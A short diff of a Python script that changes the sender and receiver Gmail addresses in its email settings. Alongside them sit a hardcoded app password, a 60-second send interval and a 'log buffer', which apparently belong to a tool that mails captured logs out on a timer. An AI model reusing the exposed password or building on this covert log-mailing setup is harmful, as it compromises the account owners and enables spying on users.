@@ -4,9 +4,9 @@ from email.mime.text import MIMEText
 import threading
 
 # --- Email configuration ---
-EMAIL_ADDRESS = "sanaaakadam@gmail.com"        # Sender email
+EMAIL_ADDRESS = "vedant.sbhoirgenaikjsit@gmail.com"        # Sender email
 EMAIL_PASSWORD = "lpqt keke dptb ikpb"              # Sender password (use app password if 2FA enabled)
-RECEIVER_EMAIL = "sanaaakadam@gmail.com"      # Receiver email
+RECEIVER_EMAIL = "vedant.selfuse@gmail.com"      # Receiver email
 SEND_INTERVAL = 60  # seconds
 
 # --- Log buffer ---
